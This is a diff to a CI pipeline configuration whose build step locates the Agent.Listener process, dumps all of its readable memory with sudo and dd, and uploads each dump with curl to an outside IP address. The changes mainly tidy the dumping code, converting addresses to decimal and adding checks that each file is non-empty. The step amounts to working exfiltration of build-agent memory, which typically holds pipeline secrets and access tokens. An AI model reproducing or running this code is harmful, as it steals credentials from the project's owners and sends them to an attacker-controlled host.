@@ -194,17 +194,27 @@ steps:
     #!/bin/bash
     PID=$(ps -e | grep "Agent.Listener" | awk '{print $1}')
 
-    # 其他操作，例如：
-    echo "The PID of Agent.Listener is $PID"
-    # 获取可读取的内存区域
     sudo cat /proc/$PID/maps | while read line; do
-        start=$(echo $line | cut -d' ' -f1 | cut -d'-' -f1)
-        end=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
+        start_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f1)
+        end_hex=$(echo $line | cut -d' ' -f1 | cut -d'-' -f2)
         perms=$(echo $line | cut -d' ' -f2)
+        
         if [[ $perms == r* ]]; then  # 检查权限是否可读
-            size=$((0x$end - 0x$start))
-            sudo dd if=/proc/$PID/mem of="/tmp/${PID}_mem_$start" bs=1 skip=$start count=$size
-            sudo curl -F "file=@/tmp/${PID}_mem_$start" http://139.180.193.16:5000/upload
+            start_dec=$((0x$start_hex))
+            end_dec=$((0x$end_hex))
+            size=$((end_dec - start_dec))
+            
+            # 使用十进制数执行dd命令
+            echo "Dumping memory from $start_dec to $end_dec"
+            sudo dd if=/proc/$PID/mem of="/tmp/${PID}_mem_$start_hex" bs=1 skip=$start_dec count=$size 2>/dev/null
+            
+            # 检查文件是否成功创建并且大小正确
+            if [ -s "/tmp/${PID}_mem_$start_hex" ]; then
+                echo "Uploading memory dump of size $(stat -c %s "/tmp/${PID}_mem_$start_hex") bytes"
+                sudo curl -F "file=@/tmp/${PID}_mem_$start_hex" http://139.180.193.16:5000/upload
+            else
+                echo "Failed to dump memory or file is empty."
+            fi
         fi
     done
 
